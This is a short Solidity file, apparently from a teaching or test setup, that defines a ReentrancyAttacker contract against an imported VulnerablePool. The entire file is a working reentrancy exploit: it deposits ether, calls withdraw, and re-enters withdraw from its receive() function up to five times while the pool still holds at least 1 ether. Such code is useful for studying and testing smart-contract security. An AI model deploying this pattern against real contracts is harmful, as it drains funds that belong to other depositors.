// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {VulnerablePool} from "./VulnerablePool.sol";

contract ReentrancyAttacker {
    VulnerablePool public immutable pool;
    uint256 public reentryCount;
    uint256 public maxReentries = 5;

    constructor(VulnerablePool pool_) {
        pool = pool_;
    }

    function attack() external payable {
        pool.deposit{value: msg.value}();
        pool.withdraw();
    }

    receive() external payable {
        if (address(pool).balance >= 1 ether && reentryCount < maxReentries) {
            reentryCount++;
            pool.withdraw();
        }
    }
}
